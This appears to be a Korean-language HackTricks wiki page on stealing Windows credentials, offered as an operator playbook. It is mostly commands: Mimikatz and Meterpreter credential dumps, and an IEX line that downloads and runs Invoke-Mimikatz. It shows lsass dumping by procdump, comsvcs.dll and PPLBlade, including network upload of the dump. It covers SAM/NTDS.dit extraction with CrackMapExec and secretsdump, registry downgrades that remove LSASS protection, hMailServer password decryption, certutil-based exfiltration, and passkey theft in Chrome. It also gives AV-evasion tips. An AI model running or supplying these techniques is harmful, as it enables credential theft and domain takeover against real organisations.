# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## 자격 증명 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[이 페이지](credentials-mimikatz.md)에서 Mimikatz가 수행할 수 있는 다른 작업을 확인하세요.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**일부 가능한 credentials 보호 방법은 여기에서 알아보세요.**](credentials-protections.md) **이 보호 기능은 Mimikatz가 일부 credentials를 추출하지 못하게 할 수 있습니다.**

## Meterpreter의 Credentials

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **을 사용하여** victim 내부에서 **password와 hash를 검색하세요.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**Procdump는** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**의 합법적인 Microsoft 도구이므로** Defender에서 탐지되지 않습니다.\
이 도구를 사용하여 **lsass 프로세스를 dump**하고, **dump를 다운로드**한 다음 dump에서 **자격 증명을 로컬에서 추출**할 수 있습니다.

[SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)로 자동 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용해 lsass.exe를 덤프하는 것**을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe" 및 "lsass.exe" 문자열**을 **탐지**하기 때문입니다. 따라서 lsass.exe의 **이름** 대신 lsass.exe의 **PID**를 procdump에 **인수**로 **전달**하는 편이 **더 은밀합니다.**

### **comsvcs.dll**을 사용한 lsass Dumping

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 충돌이 발생했을 때 **프로세스 메모리를 덤프**하는 역할을 합니다. 이 DLL에는 **`MiniDumpW`**라는 **함수**가 포함되어 있으며, `rundll32.exe`를 사용해 호출하도록 설계되었습니다.\
처음 두 인수는 사용해도 의미가 없지만, 세 번째 인수는 세 가지 구성 요소로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 구성 요소이고, 덤프 파일 위치가 두 번째 구성 요소이며, 세 번째 구성 요소는 반드시 **full**이라는 단어여야 합니다. 다른 옵션은 존재하지 않습니다.\
이 세 가지 구성 요소를 파싱한 후 DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 해당 파일로 전송합니다.\
**comsvcs.dll**을 사용하면 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에 자세히 설명되어 있습니다.<sup>[[9]](#references)</sup>

다음 명령을 사용해 실행합니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 프로세스는** [**lssasy**](https://github.com/Hackndo/lsassy)**를 사용하여 자동화할 수 있습니다.**

### **Task Manager를 사용한 lsass Dumping**

1. Task Bar를 마우스 오른쪽 버튼으로 클릭하고 Task Manager를 클릭합니다.
2. More details를 클릭합니다.
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 검색합니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump를 사용한 lsass Dumping

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite에 포함된 Microsoft 서명 바이너리입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade를 사용한 lsass Dumpin

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 dump를 난독화하고 디스크에 저장하지 않은 채 원격 워크스테이션으로 전송할 수 있도록 지원하는 Protected Process Dumper Tool입니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender의 signature-based detection 메커니즘을 회피하기 위한 메모리 dump 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB upload methods를 사용한 메모리 dump 업로드(fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump를 사용하지 않는 SSP 기반 LSASS dumping

Ink Dragon은 `MiniDumpWriteDump`를 전혀 호출하지 않는 3단계 dumper인 **LalsDumper**를 제공합니다. 따라서 해당 API에 대한 EDR hook은 절대 실행되지 않습니다:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 소문자 `d` 32개로 구성된 placeholder를 검색하고, 이를 `rtu.txt`의 absolute path로 덮어쓴 다음, 패치된 DLL을 `nfdp.dll`로 저장하고 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이를 통해 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 로드하도록 강제합니다.
2. **Stage 2 inside LSASS** – LSASS가 `nfdp.dll`을 로드하면 DLL은 `rtu.txt`를 읽고, 각 바이트를 `0x20`과 XOR한 다음, 디코딩된 blob을 memory에 매핑하고 execution을 전달합니다.
3. **Stage 3 dumper** – 매핑된 payload는 hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)에서 resolve한 **direct syscalls**를 사용해 MiniDump logic을 다시 구현합니다. `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열고, 압축된 LSASS dump를 파일로 stream한 다음 handle을 닫아 나중에 exfiltration할 수 있도록 합니다.

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 동일한 directory에 유지해야 합니다. Stage 1은 hard-coded placeholder를 `rtu.txt`의 absolute path로 다시 작성하므로, 파일을 분리하면 chain이 중단됩니다.
* Registration은 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가하는 방식으로 수행됩니다. 해당 값을 직접 seed하면 LSASS가 매 boot마다 SSP를 다시 로드하도록 만들 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 dump입니다. 로컬에서 압축을 해제한 다음 Mimikatz/Volatility에 입력해 credential extraction을 수행합니다.
* `lals.exe`를 실행하려면 admin/SeTcb 권한이 필요하므로 `AddSecurityPackageA`가 성공할 수 있습니다. call이 반환되면 LSASS는 rogue SSP를 투명하게 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 제거해도 LSASS에서 해당 DLL이 evict되지는 않습니다. Registry entry를 삭제하고 LSASS를 restart(재부팅)하거나, 장기 persistence를 위해 그대로 두어야 합니다.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프하기
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit 비밀번호 기록 Dump
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정의 pwdLastSet 특성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM 탈취

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM._에 **위치**해야 합니다. 하지만 해당 파일은 보호되어 있기 때문에 **일반적인 방법으로는 단순히 복사할 수 없습니다**.

### Registry에서

이러한 파일을 탈취하는 가장 쉬운 방법은 Registry에서 복사본을 가져오는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kali 머신으로 해당 파일을 다운로드**하고 다음 명령을 사용하여 **hashes를 추출**합니다:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하면 보호된 파일을 복사할 수 있습니다. Administrator 권한이 필요합니다.

#### Using vssadmin

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 수행할 수 있습니다. 다음은 **SAM file을 복사하는 방법**의 예시입니다 (사용되는 하드 드라이브는 "C:"이며 C:\users\Public에 저장됩니다). 하지만 이를 사용하여 보호된 파일을 복사할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

마지막으로 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며, 사용자 객체, 그룹 및 해당 멤버십에 관한 중요한 데이터를 보유합니다. 도메인 사용자의 **password hashes**가 저장되는 곳이기도 합니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 다음 세 가지 주요 테이블이 유지됩니다.

- **Data Table**: 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체의 **security descriptors**가 여기에 저장되며, 저장된 객체의 보안 및 접근 제어를 보장합니다.

자세한 내용은 다음을 참고하세요: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows는 해당 파일과 상호 작용하기 위해 _Ntdsa.dll_을 사용하며, 이는 _lsass.exe_에서 사용됩니다. 또한 **NTDS.dit** 파일의 **일부**가 **`lsass`** 메모리 내부에 있을 수 있습니다(**cache**를 사용한 성능 향상 때문일 가능성이 높으며, 가장 최근에 액세스된 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 hashes 복호화

hash는 3번 암호화됩니다.

1. **BOOTKEY**와 **RC4**를 사용하여 Password Encryption Key (**PEK**)를 복호화합니다.
2. **PEK**와 **RC4**를 사용하여 **hash**를 복호화합니다.
3. **DES**를 사용하여 **hash**를 복호화합니다.

**PEK**는 **모든 domain controller**에서 **동일한 값**이지만, **domain controller의 SYSTEM 파일에 있는 BOOTKEY(각 domain controller마다 다름)**를 사용하여 **NTDS.dit** 파일 내부에서 **암호화**됩니다. 따라서 NTDS.dit 파일에서 credentials를 가져오려면 **NTDS.dit** 및 **SYSTEM** 파일(_C:\Windows\System32\config\SYSTEM_)이 필요합니다.

### Ntdsutil을 사용하여 NTDS.dit 복사

Windows Server 2008부터 사용할 수 있습니다.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) 트릭을 사용해 **ntds.dit** 파일을 복사할 수도 있습니다. 또한 **SYSTEM 파일**의 복사본도 필요하다는 점을 기억하세요(다시 말해, [**레지스트리에서 dump하거나 volume shadow copy**](#stealing-sam-and-system) 트릭을 사용하세요).

### **NTDS.dit에서 hashes 추출**

**NTDS.dit** 및 **SYSTEM** 파일을 **확보한** 후에는 _secretsdump.py_와 같은 도구를 사용해 **hashes를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
또한 유효한 도메인 관리자 사용자를 사용하여 **자동으로 추출**할 수도 있습니다:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**big NTDS.dit files**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 좋습니다.

마지막으로 **metasploit module**인 _post/windows/gather/credentials/domain_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`도 사용할 수 있습니다.

### **NTDS.dit에서 domain objects를 SQLite database로 추출하기**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하면 NTDS objects를 SQLite database로 추출할 수 있습니다. secrets뿐만 아니라 전체 objects와 해당 attributes도 추출되므로, 원본 NTDS.dit file을 이미 확보한 경우 추가 정보 추출에 활용할 수 있습니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive는 선택 사항이지만, secrets 복호화를 가능하게 합니다(NT 및 LM hashes, cleartext passwords와 같은 supplemental credentials, kerberos 또는 trust keys, NT 및 LM password histories). 그 외 정보와 함께 다음 데이터가 추출됩니다: hashes가 포함된 user 및 machine accounts, UAC flags, 마지막 logon 및 password change timestamp, accounts description, names, UPN, SPN, groups 및 recursive memberships, organizational units tree 및 membership, trusts type, direction 및 attributes가 포함된 trusted domains...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 binary를 다운로드합니다. 이 binary를 사용하면 여러 software에서 credentials를 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 자격 증명을 추출하기 위한 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다음에서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명 추출
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

다음에서 다운로드하세요:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 그리고 **실행하기만 하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 마이닝 및 보안 제어 약화

Ink Dragon의 FinalDraft RAT에는 모든 red-teamer에게 유용한 기법을 포함하는 `DumpRDPHistory` tasker가 있습니다:<sup>[[3]](#references)</sup>

### DumpRDPHistory-style 텔레메트리 수집

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`의 모든 사용자 hive를 파싱합니다. 각 하위 키에는 서버 이름, `UsernameHint`, 마지막 쓰기 타임스탬프가 저장됩니다. PowerShell을 사용하면 FinalDraft의 로직을 복제할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그를 조회하여 Event ID **21** (successful logon) 및 **25** (disconnect)을 확인하고, 누가 해당 시스템을 관리했는지 파악합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 연결하는지 파악했다면, 해당 사용자의 **disconnected** 세션이 아직 존재하는 동안 LSASS를 덤프합니다(LalsDumper/Mimikatz 사용). CredSSP + NTLM fallback은 해당 사용자의 verifier와 토큰을 LSASS에 남기므로, 이를 SMB/WinRM을 통해 replay하여 `NTDS.dit`을 가져오거나 domain controller에 persistence를 구축할 수 있습니다.

### FinalDraft가 대상으로 삼은 Registry downgrades

동일한 implant는 credential theft를 쉽게 만들기 위해 여러 registry key도 변조합니다:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1`을 설정하면 RDP에서 전체 credential/ticket 재사용이 강제되어 pass-the-hash 방식의 pivot이 가능해집니다.
* `LocalAccountTokenFilterPolicy=1`은 UAC token filtering을 비활성화하므로 local admin이 네트워크를 통해 unrestricted token을 받게 됩니다.
* `DSRMAdminLogonBehavior=2`를 사용하면 DC가 online 상태일 때 DSRM administrator가 log on할 수 있어, 공격자에게 또 다른 기본 제공 high-privilege account가 생깁니다.
* `RunAsPPL=0`은 LSASS PPL protection을 제거하여 LalsDumper와 같은 dumper가 memory에 쉽게 접근할 수 있게 합니다.

## hMailServer database credential (post-compromise)

hMailServer는 `[Database] Password=` 아래의 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`에 DB password를 저장합니다. 이 값은 static key `THIS_KEY_IS_NOT_SECRET` 및 4-byte word endianness swap을 사용해 Blowfish로 encrypted됩니다. 다음 Python snippet에서 INI의 hex string을 사용합니다:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
평문 password를 사용해 파일 잠금을 피하도록 SQL CE database를 복사하고, 32-bit provider를 로드한 다음, 필요한 경우 upgrade한 후 hashes를 query합니다:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 열은 hMailServer hash 형식(hashcat mode `1421`)을 사용합니다. 이러한 값을 크래킹하면 WinRM/SSH 피벗에 재사용할 수 있는 credentials를 얻을 수 있습니다.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

일부 도구는 LSA logon callback `LsaApLogonUserEx2`를 가로채 **plaintext logon passwords**를 캡처합니다. 이 방식은 authentication package callback을 hook하거나 래핑하여 credentials를 **logon 중**(hashing 전)에 캡처한 다음, 이를 디스크에 기록하거나 operator에게 반환합니다. 일반적으로 LSA에 주입하거나 등록되는 helper로 구현되며, 각 성공적인 interactive/network logon 이벤트에서 username, domain 및 password를 기록합니다.<sup>[[1]](#references)</sup>

Operational notes:
- authentication path에 helper를 로드하려면 local admin/SYSTEM 권한이 필요합니다.
- 캡처된 credentials는 logon이 발생할 때만 나타납니다(hook에 따라 interactive, RDP, service 또는 network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS)는 사용자별 `sqlstudio.bin` 파일에 저장된 connection 정보를 보관합니다. 전용 dumpers는 파일을 파싱하여 저장된 SQL credentials를 복구할 수 있습니다. 명령 출력만 반환하는 shell에서는 파일을 Base64로 인코딩한 후 stdout에 출력하여 exfiltrate하는 경우가 많습니다.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
operator 측에서 파일을 다시 빌드하고 dumper를 로컬에서 실행하여 credentials를 복구합니다:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Windows의 Chrome에서 Passkeys / WebAuthn credential theft

Windows 호스트에서 **Chrome + Google Password Manager synced passkeys**를 사용하는 **victim user**로 **code execution**을 획득하면, **admin/SYSTEM** 권한이 없어도 passkeys는 흥미로운 post-exploitation 대상이 됩니다.<sup>[[4]](#references)</sup>

### 흥미로운 로컬 artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**는 protobuf로 인코딩된 **`WebauthnCredentialSpecifics`** 레코드를 저장합니다. 동일 사용자의 프로세스는 동기화된 passkey의 **RP ID**, **username**, **credential ID**, 암호화된 개인 키 자료를 열거할 수 있습니다.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**는 **`wrapped_identity_private_key`** 및 동기화된 자격 증명을 복구하는 데 사용되는 래핑된 시크릿과 같은 로컬 디바이스 등록 상태를 저장합니다.<sup>[[4]](#references)</sup>

빠른 초기 분석:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM에 바인딩된 key blob도 로컬 signing oracle로 악용될 수 있음

브라우저가 **`NCRYPT_OPAQUE_KEY_BLOB`**으로 TPM-backed identity key를 export하고 해당 blob을 사용자가 접근할 수 있는 상태에 저장하면, malware는 raw private key를 extract할 필요가 없습니다. 동일한 **machine**에서 해당 blob을 간단히 re-import한 다음, 로컬 TPM에 attacker-controlled data의 signing을 요청할 수 있습니다:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
이는 **hardware binding이 off-device export는 방지하지만, compromised endpoint에서 동일 사용자가 사용하는 것은 방지하지 못한다는 의미입니다**.

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome의 LevelDB에서 `WebauthnCredentialSpecifics`를 열거합니다.
- passkey 로그인을 시작하고 새로운 WebAuthn challenge를 획득합니다.
- 피해자 TPM에서 탈취한 `wrapped_identity_private_key` blob을 사용해 cloud-authenticator request binding에 서명합니다.
- 반환된 assertion을 relying party로 relay합니다.
- RP가 `userVerification=preferred`를 허용하거나 **`UV=0`**인 assertion을 거부하지 않는 경우 특히 유용합니다.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state`를 삭제하거나 유효하게 서명된 `device/forget` operation을 전송해 re-onboarding을 강제합니다.
- onboarding 후 기기가 **`uv_key_pending`** 상태로 남으면, attacker가 제어하는 UV public key를 등록합니다.
- provider가 새 UV key에 대한 attestation / secure-hardware origin을 검증하지 않으면, 이후 attacker key의 signature가 **`UV=1`**로 처리됩니다.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recovery 또는 rejoin을 강제해 Chrome이 synced-passkey master secret을 가져오도록 합니다.
- `passkey_enclave_state`가 재생성되거나 수정되는 시점을 감시한 다음, plaintext **security domain secret (SDS)**이 메모리에 상주하는 동안 Chrome memory를 dump합니다.
- 복구한 SDS를 사용해 모든 `WebauthnCredentialSpecifics` record의 encrypted fields를 복호화하고 portable WebAuthn private keys를 복구합니다.

### DFIR / detection ideas

- `passkey_enclave_state`의 **삭제/재생성**을 모니터링합니다.<sup>[[4]](#references)</sup>
- 비브라우저 프로세스가 Chrome **`Sync Data\LevelDB`**에 비정상적으로 액세스하는 경우 alert를 생성합니다.
- **Chrome memory dumps** 또는 의심스러운 cross-process memory access에 alert를 생성합니다.
- 반복되는 **Google Password Manager recovery PIN** prompt 또는 예상하지 못한 re-onboarding을 조사합니다.
- WebAuthn **`signCount`**는 synced passkeys에서 일정하게 유지될 수 있으므로 유용하지 않은 경우가 많습니다. 따라서 classic clone detection은 취약하다는 점을 기억해야 합니다.

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)

{{#include ../../banners/hacktricks-training.md}}
